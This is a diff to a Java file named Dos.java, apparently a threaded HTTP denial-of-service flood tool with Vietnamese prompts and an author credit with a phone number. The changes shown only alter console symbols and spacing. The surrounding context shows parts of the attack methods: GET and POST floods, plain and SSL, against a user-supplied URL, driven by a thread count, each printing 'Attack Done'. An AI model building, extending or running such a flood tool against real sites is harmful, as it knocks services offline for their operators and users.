@@ -66,7 +66,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("► @ 2022 Bản quyền: Lê Minh Tú & Zalo: 0782554949");
+        System.out.println("► @ 2022 Bản quyền : Lê Minh Tú & Zalo : 0782554949");
 
         System.out.print("► Số Luồng : ");
         String amount = in.nextLine();
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("⇒ Attack Done ┊" + "Mã số " + responseCode +  " ┊ Số Luồng : " + this.seq);
+        System.out.println("~> Attack Done ┊" + "Mã số " + responseCode +  " ┊ Số Luồng : " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("⇒ Attack Done ┊ "  + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("~> Attack Done ┊ "  + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("⇒ Attack Done ┊ " + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("~> Attack Done  ┊ " + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("⇒ Attack Done ┊ " + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("~> Attack Done ┊ " + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 }
